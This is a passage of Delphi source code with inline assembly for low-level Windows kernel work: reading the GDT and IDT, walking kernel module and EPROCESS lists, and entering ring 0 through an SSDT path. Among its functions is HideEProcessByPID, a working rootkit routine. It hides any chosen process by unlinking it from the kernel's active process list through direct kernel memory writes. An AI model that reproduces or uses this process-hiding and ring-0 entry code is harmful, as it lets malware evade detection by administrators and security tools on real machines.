  UnmapVirtualAddress(Pointer(DWord(BaseAddress) and $FFFFF000));
end;

function GetGDTCount: DWord; stdcall;
var
  GDT: TGDT;
begin
  asm
    SGDT DWORD PTR [GDT]
  end;
  Result := (GDT.wLimit+1) div 8;
end;

function GetGDTByIndex(dwIndex: DWord; var dwAddress: DWord; var bPresent: Boolean; var GType: String): Boolean; stdcall;
var
  GDT: TGDT;
  CG: TCallgateDescriptor;
begin
  Result := False;
  asm
    SGDT DWORD PTR [GDT]
  end;
  if dwIndex < ((GDT.wLimit+1) div 8) then
  begin
    if ReadKernelMemory(@CG,Pointer(((GDT.wBaseHigh shl $10) or GDT.wBaseLow)+8*dwIndex),SizeOf(CG),False) then
    begin
      bPresent := (CG.GateDescriptor and $0F00) > 0;
      dwAddress := (CG.Offset_16_31 shl $10) or CG.Offset_0_15;
      case CG.Selector of
         0: GType := 'KGDT_NULL';
         8: GType := 'KGDT_R0_CODE';
        16: GType := 'KGDT_R0_DATA';
        24: GType := 'KGDT_R3_CODE';
        32: GType := 'KGDT_R3_DATA';
        40: GType := 'KGDT_TSS';
        48: GType := 'KGDT_R0_PCR';
        56: GType := 'KGDT_R3_TEB';
        64: GType := 'KGDT_VDM_TILE';
        72: GType := 'KGDT_LDT';
        80: GType := 'KGDT_DF_TSS';
        88: GType := 'KGDT_NMI_TSS';
      else
        GType := 'Unknown';
      end;

      Result := True;
    end;
  end;
end;


function GetInterruptCount: DWord; stdcall;
var
  IDT: TGDT;
begin
  asm
    SIDT DWORD PTR [IDT]
  end;
  Result := (IDT.wLimit+1) div 8;
end;

function GetInterruptByIndex(dwIndex: DWord; var dwAddress: DWord; var bPresent: Boolean): Boolean; stdcall;
var
  IDT: TGDT;
  CG: TCallgateDescriptor;
begin
  Result := False;
  asm
    SIDT DWORD PTR [IDT]
  end;
  if dwIndex < ((IDT.wLimit+1) div 8) then
  begin
    if ReadKernelMemory(@CG,Pointer(((IDT.wBaseHigh shl $10) or IDT.wBaseLow)+8*dwIndex),SizeOf(CG),False) then
    begin
      bPresent := (CG.GateDescriptor and $0F00) > 0;
      dwAddress := (CG.Offset_16_31 shl $10) or CG.Offset_0_15;
      Result := True;
    end;
  end;
end;

function GetServiceNumber(pFunctionName: PChar): Byte; stdcall;
var
  pAddr: Pointer;
  dwIndex: DWord;
begin
  Result := 0;
  pAddr := GetProcAddress(GetModuleHandle('ntdll.dll'),pFunctionName);
  if (pAddr <> nil) then
  begin
    dwIndex := PDWord(DWord(pAddr)+1)^;
    if (dwIndex < $1FF) then
      Result := dwIndex;
  end;
end;

var
  dwModuleCount: DWord;

function GetPsLoadedModuleList: DWord;
asm
  XOR EAX, EAX
  MOV EDI, DWORD PTR [_mmgetsystemroutineaddress]
  MOV ECX, 200

@@AddrScan:
  TEST ECX, ECX
  JZ @@ende
  DEC ECX

  INC EDI
  MOV EBX, DWORD PTR [EDI]
  CMP EBX, DWORD [EDI+5] //;Check for pointer to PsLoadedModuleList XP
  JE @@Found
  CMP EBX, DWORD [EDI+6] //;Check for pointer to PsLoadedModuleList 2k
  JE @@Found
  JMP @@AddrScan
@@Found:
  MOV EAX, EDI
@@ende:
end;

procedure GetKernelModuleCountRing0;
asm
  PUSHAD
  PUSHFD
  CALL GetPsLoadedModuleList
  TEST EAX, EAX
  JZ @@Ende
  MOV EDI, EAX
  MOV EDI, [EDI]
  MOV EBX, EDI
@@module_loop:
  MOV EBX, [EBX]
  MOV ESI, [EBX+30h]
  INC [dwModuleCount]
  CMP [EBX], EDI
  JNE @@module_loop
@@Ende:
  POPFD
  POPAD
end;
procedure GetKernelModuleCountRing0End; asm end;

function GetKernelModuleCount2: DWord; stdcall;
begin
  Result := 0;
  if (_mmgetsystemroutineaddress <> nil) then
  begin
    if uallRing0.EnterRing0viaSSDT(@GetKernelModuleCountRing0,DWord(@GetKernelModuleCountRing0End) - DWord(@GetKernelModuleCountRing0)) then
      Result := dwModuleCount;
  end;
end;


function GetKernelModuleCount: DWord; stdcall;
var
  pMapMem: Pointer;
  i: DWord;
  bFound: Boolean;
  pMDL: Pointer;
  pNext: TSystemModule;
  dwFound: DWord;
  bRead: Boolean;
begin
  Result := 0;
  if (_mmgetsystemroutineaddress <> nil) then
  begin
    pMapMem := VirtualAlloc(nil,$200,MEM_COMMIT or MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (pMapMem <> nil) then
    begin
      if ReadKernelMemory(pMapMem,_mmgetsystemroutineaddress,$200, False) then
      begin
        bFound := False;
        i := 0;
        pMDL := nil;
        while (i < $200-10) and (not bFound) do
        begin
          if ((PDWord(DWord(pMapMem)+i)^) = (PDWord(DWord(pMapMem)+i+5)^)) or
             ((PDWord(DWord(pMapMem)+i)^) = (PDWord(DWord(pMapMem)+i+6)^)) then
          begin
            bFound := True;
            pMDL := PPointer(DWord(pMapMem)+i)^;
            WriteLog('Module List Base found: '+IntToHex(DWord(pMDL),8));
          end;
          Inc(i);
        end;
        if (bFound) and (pMDL <> nil) then
        begin
          if ReadKernelMemory(@pNext,pMDL,SizeOf(TSystemModule), False) then
          begin
            dwFound := 0;
            repeat
              bRead := ReadKernelMemory(@pNext,Pointer(pNext.pNext),SizeOf(TSystemModule), False);
              Inc(dwFound);
            until (not bRead) or (pNext.pNext = pMDL) or (dwFound >= 1337);
            if (bRead) and (dwFound <> 1337) then
              Result := dwFound;
          end;
        end else
          WriteLog('Module List Base not found');
      end;
      VirtualFree(pMapMem, $200, MEM_DECOMMIT);
    end;
  end else
    WriteLog('MmGetSystemRoutineAddress not found');
end;

function GetKernelModuleByIndex(dwIndex: DWord; var dwHandle: DWord; var dwModuleSize: DWord; var dwEntryPoint: DWord; var sName: String; var sPath: String): Boolean; stdcall;
var
  pMapMem: Pointer;
  i: DWord;
  bFound: Boolean;
  pMDL: Pointer;
  pNext: TSystemModule;
  dwFound: DWord;
  bRead: Boolean;
  wName: WideString;
  wPath: WideString;
begin
  Result := False;
  Inc(dwIndex);

  if (_mmgetsystemroutineaddress <> nil) then
  begin
    pMapMem := VirtualAlloc(nil,200,MEM_COMMIT or MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (pMapMem <> nil) then
    begin
      if ReadKernelMemory(pMapMem,_mmgetsystemroutineaddress,200, False) then
      begin
        bFound := False;
        i := 0;
        pMDL := nil;
        while (i < 200-10) and (not bFound) do
        begin
          if ((PDWord(DWord(pMapMem)+i)^) = (PDWord(DWord(pMapMem)+i+5)^)) or
             ((PDWord(DWord(pMapMem)+i)^) = (PDWord(DWord(pMapMem)+i+6)^)) then
          begin
            bFound := True;
            pMDL := PPointer(DWord(pMapMem)+i)^;
          end;
          Inc(i);
        end;
        if (bFound) and (pMDL <> nil) then
        begin
          if ReadKernelMemory(@pNext,pMDL,SizeOf(TSystemModule), False) then
          begin
            dwFound := 0;
            repeat
              bRead := ReadKernelMemory(@pNext,pNext.pNext,SizeOf(TSystemModule), False);
              Inc(dwFound);
            until (not bRead) or (pNext.pNext = pMDL) or (dwFound = dwIndex);

            if (bRead) and (dwFound = dwIndex) then
            begin
              SetLength(wName,pNext.Name.wLength+2);
              ZeroMemory(@wName[1],pNext.Name.wLength+2);
              if ReadKernelMemory(@wName[1],pNext.Name.pBuffer,pNext.Name.wLength, False) then
                sName := Copy(wName,1,pNext.Name.wLength div 2);

              SetLength(wPath,pNext.Path.wLength+2);
              ZeroMemory(@wPath[1],pNext.Path.wLength+2);
              if ReadKernelMemory(@wPath[1],pNext.Path.pBuffer,pNext.Path.wLength, False) then
                sPath := Copy(wPath,1,pNext.Path.wLength div 2);

              Result := True;
              dwHandle := pNext.dwModuleHandle;
              dwModuleSize := pNext.dwSizeOfImage;
              dwEntryPoint := pNext.dwEntryPoint;
            end;
          end;
        end;
      end;
      VirtualFree(pMapMem, 200, MEM_DECOMMIT);
    end;
  end;
end;


var
  dwKernelModuleHandle: DWord;
  dwModuleIndex: DWord;
  dwKernelModuleSize: DWord;
  dwKernelEntryPoint: DWord;
  sModuleName: array[0..255+256] of Char;
  sModulePath: array[0..255+256] of Char;


procedure GetKernelModuleByIndexRing0;
asm
  PUSHAD
  PUSHFD

  CALL GetPsLoadedModuleList
  TEST EAX, EAX
  JZ @@Ende

  MOV EDI, EAX
  MOV EDI, [EDI]
  MOV EBX, EDI

  MOV ECX, DWORD PTR [dwModuleIndex]

@@module_loop:
  MOV EBX, [EBX]
  TEST ECX, ECX
  JZ @@Found
  DEC ECX
  CMP [EBX], EDI
  JNE @@module_loop
JMP @@Ende


@@Found:
  MOV EDI, [EBX+18h]
  MOV [dwKernelModuleHandle], EDI

  MOV EDI, [EBX+20h]
  MOV [dwKernelModuleSize], EDI

  MOV EDI, [EBX+1Ch]
  MOV [dwKernelEntryPoint], EDI

  MOV ESI, [EBX+30h]
  MOV EDI, OFFSET sModuleName[0]

@@CopyString:
  MOV DX, WORD PTR [ESI]
  MOV WORD PTR [EDI], DX
  ADD EDI, 2
  ADD ESI, 2
  TEST DX, DX
  JNZ @@CopyString

  MOV ESI, [EBX+28h]
  MOV EDI, OFFSET sModulePath[0]

@@CopyString2:
  MOV DX, WORD PTR [ESI]
  MOV WORD PTR [EDI], DX
  ADD EDI, 2
  ADD ESI, 2
  TEST DX, DX
  JNZ @@CopyString2

@@Ende:
  POPFD
  POPAD
end;
procedure GetKernelModuleByIndexRing0End; asm end;


function GetKernelModuleByIndex2(dwIndex: DWord; var dwHandle: DWord; var dwModuleSize: DWord; var dwEntryPoint: DWord; var sName: String; var sPath: String): Boolean; stdcall;
begin
  Result := False;
  if (_mmgetsystemroutineaddress <> nil) then
  begin
    dwModuleIndex := dwIndex;
    ZeroMemory(@sModuleName[0],SizeOf(sModuleName));
    ZeroMemory(@sModulePath[0],SizeOf(sModulePath));
    if uallRing0.EnterRing0viaSSDT(@GetKernelModuleByIndexRing0,DWord(@GetKernelModuleByIndexRing0End) - DWord(@GetKernelModuleByIndexRing0)) and
      (dwKernelModuleHandle <> 0) then
    begin
      Result := True;
      dwHandle := dwKernelModuleHandle;
      dwModuleSize := dwKernelModuleSize;
      dwEntryPoint := dwKernelEntryPoint;
      sName := WideCharToString(PWideChar(@sModuleName[0]));
      sPath := WideCharToString(PWideChar(@sModulePath[0]));
    end;
  end;
end;

function GetKernelModuleHandle(pName: PChar): DWord; stdcall;
var
  sName: String;
  sPath: String;
  dwModuleHandle: DWord;
  i: DWord;
  dwModuleCount: DWord;
  bFound: Boolean;
  dwEntryPoint: DWord;
  dwModuleSize: DWord;
begin
  Result := 0;
  dwModuleCount := GetKernelModuleCount;
  bFound := False;
  if (dwModuleCount <> 0) then
  for i := 0 to dwModuleCount-1 do
  begin
    if (not bFound) and GetKernelModuleByIndex(i,dwModuleHandle,dwModuleSize,dwEntryPoint,sName,sPath) then
    begin
      if (pos(UpperCase(pName),UpperCase(sName)) > 0) then
      begin
        Result := dwModuleHandle;
        bFound := True;
      end;
    end;
  end;
end;

function GetServiceByIndex(dwIndex: DWord; var sServiceName: String; var dwServiceAddress: DWord): Boolean; stdcall;
var
  NtHeader           : PImageNtHeaders;
  DosHeader          : PImageDosHeader;
  DataDirectory      : PImageDataDirectory;
  ExportDirectory    : PImageExportDirectory;
  i                  : Integer;
  ExportName         : String;
  pFirstExportName   : Pointer;
  pExportNameNow     : PDWord;
  dwLibraryHandle    : DWord;
  pExportOrdinalNow  : PWord;
  pFirstExportOrdinal: Pointer;
  pFirstExportAddress: Pointer;
  pExportAddr        : PPointer;
begin
  Result := False;
  dwLibraryHandle := GetModuleHandle('ntdll.dll');
  if (dwLibraryHandle = 0) then
    Exit;

  DosHeader := Pointer(dwLibraryHandle);

  if (isBadReadPtr(DosHeader,sizeof(TImageDosHeader)) or
     (DosHeader^.e_magic <> IMAGE_DOS_SIGNATURE)) then
    Exit; {Wrong PE (DOS) Header}

  NtHeader := Pointer(DWord(DosHeader^._lfanew)+DWord(DosHeader));
  if (isBadReadPtr(NtHeader, sizeof(TImageNTHeaders)) or
     (NtHeader^.Signature <> IMAGE_NT_SIGNATURE)) then
    Exit; {Wrong PW (NT) Header}

  DataDirectory := @NtHeader^.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
  if (DataDirectory = nil) or (DataDirectory^.VirtualAddress = 0) then
    Exit; {Library has no exporttable}

  ExportDirectory := Pointer(DWord(DosHeader) + DWord(DataDirectory^.VirtualAddress));
  if isBadReadPtr(ExportDirectory,SizeOf(TImageExportDirectory)) then
    Exit;

  pFirstExportName := Pointer(DWord(ExportDirectory^.AddressOfNames)+DWord(DosHeader));
  pFirstExportOrdinal := Pointer(DWord(ExportDirectory^.AddressOfNameOrdinals)+DWord(DosHeader));
  pFirstExportAddress := Pointer(DWord(ExportDirectory^.AddressOfFunctions)+DWord(DosHeader));

  for i := 0 to ExportDirectory^.NumberOfNames-1 do {for each export do}
  begin
    pExportNameNow := Pointer(Integer(pFirstExportName)+SizeOf(Pointer)*i);
    if (not isBadReadPtr(pExportNameNow,SizeOf(DWord))) then
    begin
      ExportName := PChar(pExportNameNow^+ DWord(DosHeader));
      if (Copy(Exportname,1,2) = 'Nt') then
      begin
        pExportOrdinalNow := Pointer(Integer(pFirstExportOrdinal)+SizeOf(Word)*i);
        if (not isBadReadPtr(pExportOrdinalNow,SizeOf(Word))) then
        begin
          pExportAddr := Pointer(pExportOrdinalNow^*4+Integer(pFirstExportAddress));
          if ((PDWord(DWord(pExportAddr^)+1+DWord(DosHeader))^ = dwIndex)) then
          begin
            Result := True;
            sServiceName := ExportName;
            dwServiceAddress := DWord(pExportAddr^)+DWord(DosHeader);
          end;
        end;
      end;
    end;
  end;
end;

function GetServiceCount: DWord; stdcall;
var
  NtHeader           : PImageNtHeaders;
  DosHeader          : PImageDosHeader;
  DataDirectory      : PImageDataDirectory;
  ExportDirectory    : PImageExportDirectory;
  i                  : Integer;
  ExportName         : String;
  pFirstExportName   : Pointer;
  pExportNameNow     : PDWord;
  dwLibraryHandle    : DWord;
begin
  Result := 0;
  dwLibraryHandle := GetModuleHandle('ntdll.dll');
  if (dwLibraryHandle = 0) then
    Exit;

  DosHeader := Pointer(dwLibraryHandle);

  if (isBadReadPtr(DosHeader,sizeof(TImageDosHeader)) or
     (DosHeader^.e_magic <> IMAGE_DOS_SIGNATURE)) then
    Exit; {Wrong PE (DOS) Header}

  NtHeader := Pointer(DWord(DosHeader^._lfanew)+DWord(DosHeader));
  if (isBadReadPtr(NtHeader, sizeof(TImageNTHeaders)) or
     (NtHeader^.Signature <> IMAGE_NT_SIGNATURE)) then
    Exit; {Wrong PW (NT) Header}

  DataDirectory := @NtHeader^.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
  if (DataDirectory = nil) or (DataDirectory^.VirtualAddress = 0) then
    Exit; {Library has no exporttable}

  ExportDirectory := Pointer(DWord(DosHeader) + DWord(DataDirectory^.VirtualAddress));
  if isBadReadPtr(ExportDirectory,SizeOf(TImageExportDirectory)) then
    Exit;

  pFirstExportName := Pointer(DWord(ExportDirectory^.AddressOfNames)+DWord(DosHeader));

  for i := 0 to ExportDirectory^.NumberOfNames-1 do {for each export do}
  begin
    pExportNameNow := Pointer(Integer(pFirstExportName)+SizeOf(Pointer)*i);
    if (not isBadReadPtr(pExportNameNow,SizeOf(DWord))) then
    begin
      ExportName := PChar(pExportNameNow^+ DWord(DosHeader));
      if (Copy(Exportname,1,2) = 'Nt') then
        Inc(Result);
    end;
  end;
end;

var dwCR3Save: DWord;
procedure GetCR3Ring0;
asm
  MOV EAX, CR3
  MOV DWORD PTR [dwCR3Save], EAX
end;
procedure GetCR3Ring0End; asm end;

function GetCR3: DWord; stdcall;
begin
  Result := 0;
  if (EnterRing0ViaSSDT(@GetCR3Ring0,DWord(@GetCR3Ring0End)-DWord(@GetCR3Ring0))) then
    Result := dwCR3Save;
end;


function SearchPageTable: DWord; stdcall;
type
  TTable = array[0..$400-1] of DWord;
  PTable = ^TTable;
var
  i: DWord;
  Table: PTable;
  Table2: PTable;
  Found: Boolean;
  dwSection: DWord;
  MemoryStatus: TMemoryStatus;
begin
  Result := 0;
  Found := False;
  i := 0;
  dwSection := GetPhysSection;
  GlobalMemoryStatus(MemoryStatus);
  if (dwSection <> 0) then
  begin
    while (not found) and (i < MemoryStatus.dwTotalPhys) do
    begin
      Table := MapViewOfFile(dwSection, FILE_MAP_READ, 0, i, $1000);
      if (Table <> nil) then
      begin
        //DirectoryOffset>>=22;
        //TableOffset=(TableOffset>>12)&0x3ff;
        if((Table^[$300] and $FFFFF000) = i) and ((Table^[$300] and 1) = 1) and ((Table^[DWord(Table) shr 22] and 1) = 1) then
        begin
          Table2 := MapViewOfFile(dwSection, FILE_MAP_READ, 0, Table^[DWord(Table) shr 22] and $FFFFF000, $1000);
          if (Table2 <> nil) then
          begin
            if ((Table2^[(DWord(Table) shr 12) and $3FF] and 1) = 1) and ((Table2^[(DWord(Table) shr 12) and $3FF] and $FFFFF000) = i) then
            begin
              Found := True;
              Result := i;
            end;
            UnmapVirtualAddress(Table2);
          end;
        end;
        UnmapVirtualAddress(Table);
      end;
      inc(i, $1000);
    end;
    CloseHandle(dwSection);
  end;
end;


function GetEProcessCount: DWord;
var
  pMem: Pointer;
  PsGetCurrentProcessID: Pointer;
  IoGetCurrentProcess: Pointer;
  GCPID: TPsGCPID;
  GCP: TPsGCP;
  i: DWord;
  dwOffsetPIDinEProcess: DWord;
  dwOffsetNameinEProcess: DWord;
  buf: array[0..16] of Char;
  myName: String;
  nextAddr: Pointer;
  firstAddr: Pointer;
  bError: Boolean;
  Ldt: TLdtEntry;
  fs124: DWord;
  MyEProcess: Pointer;
  MyEProcessID: DWord;
  PIDOffset: DWord;
  EProcessOffset: DWord;
begin
  Result := 0;

  if not GetThreadSelectorEntry(DWord(-2), $30, Ldt) then
    Exit;

  PsGetCurrentProcessID := GetKernelProcAddress(ntoskrnl,'PsGetCurrentProcessId');
  if (PsGetCurrentProcessID = nil) then
    Exit;
  if not ReadKernelMemory(@GCPID,PsGetCurrentProcessID,SizeOf(GCPID), False) then
    Exit;
  if (GCPID.fs <> $64) or (GCPID.estruct > $1000) or (GCPID.epid > $1000) then
    Exit;

  IoGetCurrentProcess := GetKernelProcAddress(ntoskrnl,'IoGetCurrentProcess');
  if (IoGetCurrentProcess = nil) then
    Exit;
  if not ReadKernelMemory(@GCP,IoGetCurrentProcess,SizeOf(GCP), False) then
    Exit;
  if (GCP.fs <> $64) or (GCP.estruct > $1000) or (GCP.epprocess = 0) then
    Exit;
  IF (GCP.estruct <> GCPID.estruct) then
    Exit;

  PIDOffset := GCPID.epid;
  EProcessOffset := GCP.epprocess;

  myName := uallUtil.ExtractFileNameWithExtention(paramstr(0));
  if (Length(myName) > 16) then
    myName := Copy(myName,1,16);

  if (not ReadKernelMemory(@fs124,Pointer(((Ldt.BaseHi shl 24) or (Ldt.BaseMid shl 16) or Ldt.BaseLow)+$124), SizeOf(DWord), False)) then
    Exit;

  if (not ReadKernelMemory(@myEProcess,Pointer(fs124+EProcessOffset),SizeOf(DWord),False)) then
    Exit;

  if (not ReadKernelMemory(@MyEProcessID,Pointer(fs124+PIDOffset),SizeOf(DWord),False)) then
    Exit;

  pMem := VirtualAlloc(nil, $1000, MEM_COMMIT or MEM_RESERVE, PAGE_EXECUTE_READWRITE);
  if (pMem <> nil) then
  begin
    if (ReadKernelMemory(pMem, MyEProcess, $1000, False)) then
    begin
      if (MyEProcessID = GetCurrentProcessID) then
      begin
        dwOffsetPIDinEProcess := 0;
        for i := 0 to $100 div 4 do
        begin
          if (PDWord(DWord(pMem)+i*4)^ = MyEProcessID) then
            dwOffsetPIDinEProcess := i*4;
        end;
        if (dwOffsetPIDinEProcess <> 0) then
        begin
          dwOffsetNameinEProcess := 0;
          for i := 0 to $1000-20 do
          begin
            ZeroMemory(@buf[0],17);
            CopyMemory(@buf[0], Pointer(DWord(pMem)+i),16);
            if (UpperCase(Copy(PChar(@buf[0]),1,Length(myName))) = UpperCase(myName)) then
            begin
              dwOffsetNameinEProcess := i;
            end;
          end;
          if (dwOffsetNameinEProcess <> 0) then
          begin
            firstAddr := PPointer(DWord(pMem)+dwOffsetPIDinEProcess+4)^;
            nextAddr := firstAddr;
            bError := False;
            repeat
              if ReadkernelMemory(@nextAddr,nextAddr,4,False) then
              begin
                if (firstAddr <> nextAddr) then
                begin
                  Inc(Result);
                end;
              end else
                bError := True;
            until (firstAddr = nextAddr) or (bError);
            if (bError) then
              Result := 0; //else
              //dec(Result);
          end;
        end;
      end;
    end;
    VirtualFree(pMem,$1000,MEM_DECOMMIT);
  end;
end;

function HideEProcessByPID(dwPID: DWord): Boolean; stdcall
var
  pMem: Pointer;
  PsGetCurrentProcessID: Pointer;
  IoGetCurrentProcess: Pointer;
  GCPID: TPsGCPID;
  GCP: TPsGCP;
  i: DWord;
  dwOffsetPIDinEProcess: DWord;
  dwOffsetAPLinEProcess: DWord;
  dwOffsetNameinEProcess: DWord;
  buf: array[0..16] of Char;
  myName: String;
  nextAddr: Pointer;
  firstAddr: Pointer;
  bError: Boolean;
  newEProcess: Pointer;
  Ldt: TLdtEntry;
  fs124: DWord;
  MyEProcess: Pointer;
  MyEProcessID: DWord;
  PIDOffset: DWord;
  EProcessOffset: DWord;
  dwNext: DWord;
  dwPrev: DWord;
  dwPIDRead: DWord;
//  dwE1: DWord;
//  sS1: String;
begin
  Result := False;

  if not GetThreadSelectorEntry(DWord(-2), $30, Ldt) then
    Exit;

  PsGetCurrentProcessID := GetKernelProcAddress(ntoskrnl,'PsGetCurrentProcessId');
  if (PsGetCurrentProcessID = nil) then
    Exit;
  if not ReadKernelMemory(@GCPID,PsGetCurrentProcessID,SizeOf(GCPID), False) then
    Exit;
  if (GCPID.fs <> $64) or (GCPID.estruct > $1000) or (GCPID.epid > $1000) then
    Exit;

  IoGetCurrentProcess := GetKernelProcAddress(ntoskrnl,'IoGetCurrentProcess');
  if (IoGetCurrentProcess = nil) then
    Exit;
  if not ReadKernelMemory(@GCP,IoGetCurrentProcess,SizeOf(GCP), False) then
    Exit;
  if (GCP.fs <> $64) or (GCP.estruct > $1000) or (GCP.epprocess = 0) then
    Exit;
  IF (GCP.estruct <> GCPID.estruct) then
    Exit;

  PIDOffset := GCPID.epid;
  EProcessOffset := GCP.epprocess;

  myName := uallUtil.ExtractFileNameWithExtention(paramstr(0));
  if (Length(myName) > 16) then
    myName := Copy(myName,1,16);

  if (not ReadKernelMemory(@fs124,Pointer(((Ldt.BaseHi shl 24) or (Ldt.BaseMid shl 16) or Ldt.BaseLow)+$124), SizeOf(DWord), False)) then
    Exit;

  if (not ReadKernelMemory(@myEProcess,Pointer(fs124+EProcessOffset),SizeOf(DWord),False)) then
    Exit;

  if (not ReadKernelMemory(@MyEProcessID,Pointer(fs124+PIDOffset),SizeOf(DWord),False)) then
    Exit;

  pMem := VirtualAlloc(nil, $1000, MEM_COMMIT or MEM_RESERVE, PAGE_EXECUTE_READWRITE);
  if (pMem <> nil) then
  begin
    if (ReadKernelMemory(pMem, MyEProcess, $1000, False)) then
    begin
      if (MyEProcessID = GetCurrentProcessID) then
      begin
        dwOffsetPIDinEProcess := 0;
        for i := 0 to $100 div 4 do
        begin
          if (PDWord(DWord(pMem)+i*4)^ = MyEProcessID) then
            dwOffsetPIDinEProcess := i*4;
        end;
        if (dwOffsetPIDinEProcess <> 0) then
        begin
          dwOffsetAPLinEProcess := dwOffsetPIDinEProcess+4;
          dwOffsetNameinEProcess := 0;
          for i := 0 to $1000-20 do
          begin
            ZeroMemory(@buf[0],17);
            CopyMemory(@buf[0], Pointer(DWord(pMem)+i),16);
            if (UpperCase(Copy(PChar(@buf[0]),1,Length(myName))) = UpperCase(myName)) then
            begin
              dwOffsetNameinEProcess := i;
            end;
          end;
          if (dwOffsetNameinEProcess <> 0) then
          begin
            firstAddr := PPointer(DWord(pMem)+dwOffsetPIDinEProcess+4)^;
            nextAddr := firstAddr;
            bError := False;
            repeat
              if ReadKernelMemory(@nextAddr,nextAddr,4,False) then
              begin
                if (firstAddr <> nextAddr) then
                begin
                  newEProcess := Pointer(DWord(nextAddr)-dwOffsetAPLinEProcess);
                  if ReadKernelMemory(@dwPIDRead,Pointer(DWord(newEProcess)+dwOffsetPIDinEProcess),4,False) and (dwPIDRead = dwPID) then
                  begin
                    if ReadKernelMemory(@dwPrev,Pointer(DWord(nextAddr)+4),4,False) and
                       ReadKernelMemory(@dwNext,Pointer(DWord(nextAddr)+0),4,False) and
                       WriteKernelMemory(Pointer(dwPrev),@dwNext,4,False) and
                       WriteKernelMemory(Pointer(dwNext+4),@dwPrev,4,False) then
                    begin
                      //if GetEProcessByIndex(1,dwE1,sS1,dwPID) then
                      //dwPID := $FFFFFFFF;
                      //if WriteKernelMemory(Pointer(DWord(newEProcess)+dwOffsetPIDinEProcess), @dwPID, 4, False) then
                      begin
                        Result := True;
                        bError := True;
                      end;
                    end;
                  end;
                end;
              end else
                bError := True;
            until (firstAddr = nextAddr) or (bError) or (Result);
          end;
        end;
      end;
    end;
    VirtualFree(pMem,$1000,MEM_DECOMMIT);
  end;
end;

function GetEProcessByIndex(dwIndex: DWord; var dwEProcess: DWord; var sModuleName: String; var dwPID: DWord): Boolean; stdcall;
var
  pMem: Pointer;
  PsGetCurrentProcessID: Pointer;
  IoGetCurrentProcess: Pointer;
  GCPID: TPsGCPID;
  GCP: TPsGCP;
  i: DWord;
  buf: array[0..16] of Char;
  myName: String;
  nextAddr: Pointer;
  firstAddr: Pointer;
  bError: Boolean;
  newEProcess: Pointer;
  Ldt: TLdtEntry;
  fs124: DWord;
  MyEProcess: Pointer;
  MyEProcessID: DWord;
  PIDOffset: DWord;
  dwOffsetAPLinEProcess: DWord;
  EProcessOffset: DWord;
  dwOffsetPIDinEProcess: DWord;
  dwOffsetNameinEProcess: DWord;
begin
  Result := False;

  if not GetThreadSelectorEntry(DWord(-2), $30, Ldt) then
    Exit;

  PsGetCurrentProcessID := GetKernelProcAddress(ntoskrnl,'PsGetCurrentProcessId');
  if (PsGetCurrentProcessID = nil) then
    Exit;
  if not ReadKernelMemory(@GCPID,PsGetCurrentProcessID,SizeOf(GCPID), False) then
    Exit;
  if (GCPID.fs <> $64) or (GCPID.estruct > $1000) or (GCPID.epid > $1000) then
    Exit;

  IoGetCurrentProcess := GetKernelProcAddress(ntoskrnl,'IoGetCurrentProcess');
  if (IoGetCurrentProcess = nil) then
    Exit;
  if not ReadKernelMemory(@GCP,IoGetCurrentProcess,SizeOf(GCP), False) then
    Exit;
  if (GCP.fs <> $64) or (GCP.estruct > $1000) or (GCP.epprocess = 0) then
    Exit;
  IF (GCP.estruct <> GCPID.estruct) then
    Exit;

  PIDOffset := GCPID.epid;
  EProcessOffset := GCP.epprocess;

  myName := uallUtil.ExtractFileNameWithExtention(paramstr(0));
  if (Length(myName) > 16) then
    myName := Copy(myName,1,16);

  if (not ReadKernelMemory(@fs124,Pointer(((Ldt.BaseHi shl 24) or (Ldt.BaseMid shl 16) or Ldt.BaseLow)+$124), SizeOf(DWord), False)) then
    Exit;

  if (not ReadKernelMemory(@myEProcess,Pointer(fs124+EProcessOffset),SizeOf(DWord),False)) then
    Exit;

  if (not ReadKernelMemory(@MyEProcessID,Pointer(fs124+PIDOffset),SizeOf(DWord),False)) then
    Exit;

  pMem := VirtualAlloc(nil, $1000, MEM_COMMIT or MEM_RESERVE, PAGE_EXECUTE_READWRITE);
  if (pMem <> nil) then
  begin
    if (ReadKernelMemory(pMem, MyEProcess, $1000, False)) then
    begin
      if (MyEProcessID = GetCurrentProcessID) then
      begin
        dwOffsetPIDinEProcess := 0;
        for i := 0 to $100 div 4 do
        begin
          if (PDWord(DWord(pMem)+i*4)^ = MyEProcessID) then
            dwOffsetPIDinEProcess := i*4;
        end;
        if (dwOffsetPIDinEProcess <> 0) then
        begin
          dwOffsetAPLinEProcess := dwOffsetPIDinEProcess+4;
          dwOffsetNameinEProcess := 0;
          for i := 0 to $1000-20 do
          begin
            ZeroMemory(@buf[0],17);
            CopyMemory(@buf[0], Pointer(DWord(pMem)+i),16);
            if (UpperCase(Copy(PChar(@buf[0]),1,Length(myName))) = UpperCase(myName)) then
            begin
              dwOffsetNameinEProcess := i;
            end;
          end;
          if (dwOffsetNameinEProcess <> 0) then
          begin
            firstAddr := PPointer(DWord(pMem)+dwOffsetAPLinEProcess)^;

            nextAddr := firstAddr;
            bError := False;
            repeat
              if ReadkernelMemory(@nextAddr,nextAddr,4,False) then
              begin
                //if (firstAddr <> nextAddr) then
                begin
                  newEProcess := Pointer(DWord(nextAddr)-dwOffsetAPLinEProcess);
                  if (dwIndex = 0) then
                  begin
                    if ReadkernelMemory(pMem,newEProcess,$1000,False) then
                    begin
                      ZeroMemory(@buf[0],17);
                      CopyMemory(@buf[0], Pointer(DWord(pMem)+dwOffsetNameinEProcess),16);
                      Result := True;
                      sModuleName := PChar(@Buf[0]);
                      dwPID := PDWord(DWord(pMem)+dwOffsetPIDinEProcess)^;
                      dwEProcess := DWord(newEProcess);
                      if (dwPID = 0) then
                        sModuleName := 'Idle';
                    end;
                  end else dec(dwIndex);
                end;
              end else
                bError := True;
            until (firstAddr = nextAddr) or (bError) or (Result);
          end;
        end;
      end;
    end;
    VirtualFree(pMem,$1000,MEM_DECOMMIT);
  end;
end;

initialization
begin

end;

finalization
begin

end;

end.
